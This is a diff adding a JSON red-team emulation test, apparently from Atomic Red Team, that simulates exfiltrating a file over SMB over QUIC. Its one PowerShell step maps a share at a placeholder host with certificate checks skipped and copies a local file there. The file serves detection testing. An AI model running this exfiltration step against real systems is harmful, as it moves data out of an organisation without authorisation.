@@ -1,0 +1,37 @@
+{
+  "id": "d8d13303-159e-4f33-89f4-9f07812d016f",
+  "name": "Exfiltration Over SMB over QUIC (New-SmbMapping)",
+  "description": "Simulates an attacker exfiltrating data over SMB over QUIC using the New-SmbMapping command.\nPrerequisites:\n  - A file server running Windows Server 2022 Datacenter: Azure Edition\n  - A Windows 11 computer\n  - Windows Admin Center\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "03bef775-39e9-4525-b60a-1c988bfa26f0",
+      "type": "execute-command",
+      "data": {
+        "command": "New-SmbMapping -RemotePath '#{remote_path}' -TransportType QUIC -SkipCertificateCheck\ncopy '#{local_file}' 'Z:\\'\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1570",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "remote_path",
+      "type": "string",
+      "description": "The UNC path to the share on the file server",
+      "value": "\\\\example.com\\sales"
+    },
+    {
+      "name": "local_file",
+      "type": "path",
+      "description": "The local file to be transferred",
+      "value": "C:\\path\\to\\file.txt"
+    }
+  ]
+}
